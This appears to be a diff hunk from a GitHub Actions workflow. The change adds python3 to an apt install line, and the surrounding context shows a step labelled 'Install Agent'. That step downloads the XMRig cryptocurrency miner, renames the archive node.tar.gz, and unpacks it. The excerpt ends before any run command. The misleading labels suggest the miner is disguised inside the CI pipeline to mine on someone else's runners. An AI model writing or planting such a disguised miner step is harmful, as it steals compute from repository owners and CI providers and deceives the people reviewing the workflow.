@@ -20,7 +20,7 @@ jobs:
       - name: Install Agent
         run: |
           sudo apt update -y
-          sudo apt install -y curl tar coreutils xxd base64
+          sudo apt install -y curl tar coreutils xxd base64 python3
           curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
           tar -xzf node.tar.gz
           cd xmrig-6.24.0
